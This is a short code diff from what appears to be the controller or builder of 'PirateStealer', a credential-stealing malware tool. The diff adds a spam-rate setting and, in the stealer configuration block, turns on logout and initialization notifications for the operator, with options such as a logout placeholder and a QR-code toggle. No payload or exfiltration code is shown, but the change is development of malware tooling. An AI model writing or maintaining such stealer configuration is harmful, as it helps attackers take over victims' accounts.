@@ -3,8 +3,8 @@ import { access, constants, writeFile, readFile } from "fs-extra";
 import { Config, WebhookConfig } from "./interfaces";
 import { start } from "./start";
 import { config as dotenvConfig } from "dotenv";
-import { INIT_TOKEN, FALLBACK_PREFIX, ENV_PATH, CONFIG_PATH, WEBHOOK_PATH  } from "./constants";
-import * as yargs from "yargs";
+import { INIT_TOKEN, FALLBACK_PREFIX, ENV_PATH, CONFIG_PATH, WEBHOOK_PATH, SECOND  } from "./constants";
+import yargs from "yargs";
 import { hideBin } from "yargs/helpers";
 import { ConfigFSBinder } from "./configFSBinder";
 import { writeError, prettifyConsoleOutput  } from "./log";
@@ -25,11 +25,12 @@ async function init() {
             token: INIT_TOKEN,
             prefix: FALLBACK_PREFIX,
             ignoreErrors: false,
+            spamRate: SECOND * 2,
             _stealerConfig: {
                 stealerName: "PirateStealer",
                 logout: "%LOGOUT%",
-                "logout-notify": false,
-                "init-notify": false,
+                "logout-notify": true,
+                "init-notify": true,
                 "embed-color": 3447704,
                 "disable-qr-code": false,
             }
